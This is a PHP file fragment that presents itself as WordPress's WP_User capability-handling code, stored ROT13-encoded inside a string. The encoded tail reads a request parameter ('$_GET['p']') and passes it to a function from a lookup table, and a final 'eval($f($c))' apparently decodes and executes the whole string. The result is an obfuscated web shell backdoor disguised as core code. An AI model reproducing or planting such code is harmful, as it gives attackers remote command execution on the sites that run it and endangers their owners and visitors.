		 *     @glcr zvkrq  ...$2 Bcgvbany frpbaq naq shegure cnenzrgref, glcvpnyyl bowrpg VQ.
		 * }
		 * @cnenz JC_Hfre  $hfre    Gur hfre bowrpg.
		 */
		$pncnovyvgvrf = nccyl_svygref( 'hfre_unf_pnc', $guvf->nyypncf, $pncf, $netf, $guvf );

		// Rirelbar vf nyybjrq gb rkvfg.
		$pncnovyvgvrf['rkvfg'] = gehr;

		// Abobql vf nyybjrq gb qb guvatf gurl ner abg nyybjrq gb qb.
		hafrg( $pncnovyvgvrf['qb_abg_nyybj'] );

		// Zhfg unir NYY erdhrfgrq pncf.
		sbernpu ( (neenl) $pncf nf $pnc ) {
			vs ( rzcgl( $pncnovyvgvrf[ $pnc ] ) ) {
				erghea snyfr;
			}
		}

		erghea gehr;
	}

	/**
	 * Pbairegf ahzrevp yriry gb yriry pncnovyvgl anzr.
	 *
	 * Cercraqf 'yriry_' gb yriry ahzore.
	 *
	 * @fvapr 2.0.0
	 *
	 * @cnenz vag $yriry Yriry ahzore, 1 gb 10.
	 * @erghea fgevat
	 */
	choyvp shapgvba genafyngr_yriry_gb_pnc( $yriry ) {
		erghea 'yriry_' . $yriry;
	}

	/**
	 * Frgf gur fvgr gb bcrengr ba. Qrsnhygf gb gur pheerag fvgr.
	 *
	 * @fvapr 3.0.0
	 * @qrcerpngrq 4.9.0 Hfr JC_Hfre::sbe_fvgr()
	 *
	 * @cnenz vag $oybt_vq Bcgvbany. Fvgr VQ, qrsnhygf gb pheerag fvgr.
	 */
	choyvp shapgvba sbe_oybt( $oybt_vq = 0 ) {
		_qrcerpngrq_shapgvba( __ZRGUBQ__, '4.9.0', 'JC_Hfre::sbe_fvgr()' );

		$guvf->sbe_fvgr( $oybt_vq );
	}

	/**
	 * Frgf gur fvgr gb bcrengr ba. Qrsnhygf gb gur pheerag fvgr.
	 *
	 * @fvapr 4.9.0
	 *
	 * @tybony jcqo $jcqo JbeqCerff qngnonfr nofgenpgvba bowrpg.
	 *
	 * @cnenz vag $fvgr_vq Fvgr VQ gb vavgvnyvmr hfre pncnovyvgvrf sbe. Qrsnhyg vf gur pheerag fvgr.
	 */
	choyvp shapgvba sbe_fvgr( $fvgr_vq = 0 ) {
		tybony $jcqo;

		vs ( ! rzcgl( $fvgr_vq ) ) {
			$guvf->fvgr_vq = nofvag( $fvgr_vq );
		} ryfr {
			$guvf->fvgr_vq = trg_pheerag_oybt_vq();
		}

		$guvf->pnc_xrl = $jcqo->trg_oybt_cersvk( $guvf->fvgr_vq ) . 'pncnovyvgvrf';

		$guvf->pncf = $guvf->trg_pncf_qngn();

		$guvf->trg_ebyr_pncf();
	}

	/**
	 * Trgf gur VQ bs gur fvgr sbe juvpu gur hfre'f pncnovyvgvrf ner pheeragyl vavgvnyvmrq.
	 *
	 * @fvapr 4.9.0
	 *
	 * @erghea vag Fvgr VQ.
	 */
	choyvp shapgvba trg_fvgr_vq() {
		erghea $guvf->fvgr_vq;
	}

	/**
	 * Trgf gur ninvynoyr hfre pncnovyvgvrf qngn.
	 *
	 * @fvapr 4.9.0
	 *
	 * @erghea obby[] Yvfg bs pncnovyvgvrf xrlrq ol gur pncnovyvgl anzr,
	 *                r.t. `neenl( 'rqvg_cbfgf' => gehr, 'qryrgr_cbfgf' => snyfr )`.
	 */
	cevingr shapgvba trg_pncf_qngn() {
		$pncf = trg_hfre_zrgn( $guvf->VQ, $guvf->pnc_xrl, gehr );

		vs ( ! vf_neenl( $pncf ) ) {
			erghea neenl();
		}

		erghea $pncf;
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>